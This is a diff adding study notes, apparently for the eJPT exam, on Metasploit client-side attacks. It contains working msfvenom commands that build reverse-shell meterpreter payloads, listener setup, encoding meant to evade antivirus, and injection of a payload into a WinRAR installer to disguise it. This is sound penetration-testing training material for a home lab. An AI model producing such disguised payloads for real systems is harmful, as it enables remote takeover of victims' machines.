@@ -1446,11 +1446,392 @@ run
 curl http://192.28.60.3:80/data/file.txt
 ```
 
-## Client-Side Attacks with MSF
+## [Client-Side Attacks](https://www.offsec.com/metasploit-unleashed/client-side-attacks/) with MSF
 
+A **client-side attack** is a security breach that happens on the client side.
 
+- Social engineering techniques take advantage of human vulnerabilities
+- Require user-interaction to open malicious documents or portable executables (**`PEs`**)
+- The payload is stored on the client's system
+- Attackers have to pay attention to Anti Virus detection
 
+> ❗ ***Advanced modern antivirus solutions detects and blocks this type of payloads very easily.***
 
+### [Msfvenom](https://www.offsec.com/metasploit-unleashed/msfvenom/) Payloads
+
+> [**`msfvenom`**](https://www.kali.org/tools/metasploit-framework/#msfvenom) - a Metasploit standalone payload generator and encoder
+>
+> - **`e.g.`** - generate a malicious meterpreter payload, transfer it to a client target; once executed it will connect back to the payload handler and provides with remote access
+
+- List available payloads
+
+```bash
+msfvenom --list payloads
+```
+
+- When generating a payload the exact name of the payload must be specified
+  - target operating system
+  - target O.S. architecture (x64, x86 ...)
+  - payload type
+  - protocol used to connect back (depends on requirements)
+
+![](.gitbook/assets/image-20230415190726950.png)
+
+**`e.g.`** of **Staged payload**
+
+- `windows/x64/meterpreter/reverse_tcp`
+
+**`e.g.`** of **Non-Staged payload**
+
+- `windows/x64/meterpreter_reverse_https`
+
+![](.gitbook/assets/image-20230415191239575.png)
+
+- Generate a Windows payload with `msfvenom`
+
+**32bit payload:**
+
+```bash
+msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=1234 -f exe > /home/kali/certs/ejpt/Windows_Payloads/payloadx86.exe
+
+# LHOST = Attacker IP address
+```
+
+**64bit payload:**
+
+```bash
+msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=1234 -f exe > /home/kali/certs/ejpt/Windows_Payloads/payloadx64.exe
+```
+
+- List the output formats available
+
+```bash
+msfvenom --list formats
+```
+
+```bash
+Framework Executable Formats [--format <value>]
+===============================================
+    Name
+    ----
+    asp
+    aspx
+    aspx-exe
+    axis2
+    dll
+    ducky-script-psh
+    elf
+    elf-so
+    exe
+    exe-only
+    exe-service
+    exe-small
+    hta-psh
+    jar
+    jsp
+    loop-vbs
+    macho
+    msi
+    msi-nouac
+    osx-app
+    psh
+    psh-cmd
+    psh-net
+    psh-reflection
+    python-reflection
+    vba
+    vba-exe
+    vba-psh
+    vbs
+    war
+
+Framework Transform Formats [--format <value>]
+==============================================
+    Name
+    ----
+    base32
+    base64
+    bash
+    c
+    csharp
+    dw
+    dword
+    go
+    golang
+    hex
+    java
+    js_be
+    js_le
+    nim
+    nimlang
+    num
+    perl
+    pl
+    powershell
+    ps1
+    py
+    python
+    raw
+    rb
+    ruby
+    rust
+    rustlang
+    sh
+    vbapplication
+    vbscript
+```
+
+- Generate a Linux payload with `msfvenom`
+
+**32bit payload:**
+
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=1234 -f elf > /home/kali/certs/ejpt/Linux_Payloads/payloadx86
+```
+
+**64bit payload:**
+
+```bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=1234 -f elf > /home/kali/certs/ejpt/Linux_Payloads/payloadx64
+```
+
+- 📌 *Platform and architecture are auto selected if not specified, based on the selected payload*
+
+![image-20230415192514206](.gitbook/assets/image-20230415192514206.png)
+
+The transferring method onto the target system depends on the type of the social engineering technique.
+
+- **`e.g.`** A simple web server can be set up on the attacker system to serve the payload files and a handler to receive the connection back from the target system
+
+```bash
+cd /home/kali/certs/ejpt/Windows_Payloads
+sudo python -m http.server 8080
+```
+
+- To deal with a `meterpreter` payload, an appropriate listener is necessary to handle the reverse connection, the `multi/handler` Metasploit module in this case
+
+```bash
+msfconsole -q
+```
+
+```bash
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.31.128
+set LPORT 1234
+run
+```
+
+- Download the payload on the Windows 2008 system (in this case my home lab VM) from this link
+
+  - `http://192.168.31.128:8080`
+  - Run the `payloadx86.exe` payload on the target
+- The `meterpreter` session on the attacker machine should be opened
+
+![](.gitbook/assets/image-20230415200856110.png)
+
+Same example with the `linux/x86/meterpreter/reverse_tcp` Linux payload executed on the Kali VM.
+
+![image-20230415201253314](.gitbook/assets/image-20230415201253314.png)
+
+### Encoding Payloads
+
+Signature based Antivirus solutions can detect malicious files or executables. Older AV solutions can be evaded by **encoding** the payloads.
+
+- ❗ *This kind of attack vector is outdated and hardly used today*.
+- May work on legacy old O.S. like Windows 7 or older.
+
+🗒️ Payload **Encoding** involves changing the payload shellcode *with the aim of changing the payload signature*.
+
+-  [Encoding will not always avoid detection](https://docs.rapid7.com/metasploit/encoded-payloads-bypassing-anti-virus)
+
+🗒️ **Shellcode** is the code typically used as a *payload* for exploitation, that provides with a remote *command shell* on the target system.
+
+```bash
+msfvenom --list encoders
+```
+
+![msfvenom --list encoders](.gitbook/assets/image-20230415212307184.png)
+
+- Excellent encoders are **`cmd/powershell_base64`** and **`x86/shikata_ga_nai`**
+
+#### Windows Payload
+
+- Generate a Win x86 payload and encode it with `shikata_ga_nai`:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=1234 -e x86/shikata_ga_nai -f exe > /home/kali/certs/ejpt/Windows_Payloads/encodedx86.exe
+```
+
+![msfvenom shikata_ga_nai Win](.gitbook/assets/image-20230415213830109.png)
+
+- The payload can be encoded as often as desired by increasing the number of iterations.
+- The more iterations, the better chances to bypass an Antivirus. Use **`-i`** option.
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > /home/kali/certs/ejpt/Windows_Payloads/encodedx86.exe
+```
+
+![](.gitbook/assets/image-20230415213941131.png)
+
+#### Linux Payload
+
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > /home/kali/certs/ejpt/Linux_Payloads/encodedx86    
+```
+
+![msfvenom shikata_ga_nai Linux](.gitbook/assets/image-20230415213215234.png)
+
+- Test each of the above generated payloads, like before
+
+```bash
+cd /home/kali/certs/ejpt/Windows_Payloads
+sudo python -m http.server 8080
+msfconsole -q
+
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.31.128
+set LPORT 1234
+run
+```
+
+![](.gitbook/assets/image-20230415213745031.png)
+
+> 📌 Modern antivirus detects and blocks the encoded payload as soon as the download is started:
+>
+> ![](.gitbook/assets/image-20230415214414552.png)
+
+### Injecting Payloads into PEs
+
+🗒️ [Windows **Portable Executable**]() (**PE**) *is a file format for executables, object code, DLLs and others, used in 32-bit and 64-bit Windows O.S.*
+
+- Download a portable executable, **`e.g.`** [WinRAR](https://www.win-rar.com/download.html)
+
+- Payloads can be injected into PEs with `msfvenom` with the **`-x`** and **`-k`** options
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x winrar-x32-621.exe > /home/kali/certs/ejpt/Windows_Payloads/winrar.exe
+```
+
+![](.gitbook/assets/image-20230415220833685.png)
+
+```bash
+cd /home/kali/certs/ejpt/Windows_Payloads
+sudo python -m http.server 8080
+msfconsole -q
+
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.31.128
+set LPORT 1234
+run
+```
+
+- Transfer and run the `winrar.exe` file to the target O.S.
+- File description is kept, but not its functionality.
+
+![](.gitbook/assets/image-20230415221016113.png)
+
+![](.gitbook/assets/image-20230415221130544.png)
+
+- Proceed with the Post Exploitation module to migrate the process into another one, in the `meterpreter` session
+
+```bash
+run post/windows/manage/migrate
+```
+
+![](.gitbook/assets/image-20230415221432202.png)
+
+### Automation with Resource Scripts
+
+Repetitive tasks and commands can be automated using **MSF resource scripts** (same as batch scripts).
+
+- Almost every MSF command can be automated.
+
+```bash
+ls -al /usr/share/metasploit-framework/scripts/resource
+```
+
+![/usr/share/metasploit-framework/scripts/resource](.gitbook/assets/image-20230415222643575.png)
+
+**`e.g. 1`**
+
+- *Automate the process of setting up a handler for the generated payloads*, by creating a new `handler.rc` file
+
+```bash
+nano handler.rc
+
+# Insert the following lines
+# by specifying the commands sequentially
+
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.31.128
+set LPORT 1234
+run
+
+# Save it and exit
+```
+
+- Load and run the recourse script in `msfconsole`
+
+```bash
+msfconsole -q -r handler.rc
+```
+
+![msfconsole -q -r handler.rc](.gitbook/assets/image-20230415223258567.png)
+
+**`e.g. 2`**
+
+```bash
+nano portscan.rc
+
+# Insert the following lines
+# by specifying the commands sequentially
+
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.31.131
+run
+
+# Save it and exit
+```
+
+```bash
+msfconsole -q -r portscan.rc
+```
+
+![msfconsole -q -r portscan.rc](.gitbook/assets/image-20230415223936432.png)
+
+**`e.g. 3`**
+
+```bash
+nano db_status.rc
+
+db_status
+workspace
+workspace -a TEST
+```
+
+```bash
+msfconsole -q -r db_status.rc
+```
+
+![](.gitbook/assets/image-20230415224235665.png)
+
+- 📌 Load up a resource script from within the `msfconsole` with the **`resource`** command
+
+```bash
+resource /home/kali/certs/ejpt/resource_scripts/handler.rc
+```
+
+- Typed in commands in a new `msfconsole` session, can be exported in a new resource script
+
+```bash
+makerc /home/kali/certs/ejpt/resource_scripts/portscan2.rc
+```
+
+![](.gitbook/assets/image-20230415224836969.png)
 
 ## Exploitation with MSF
 
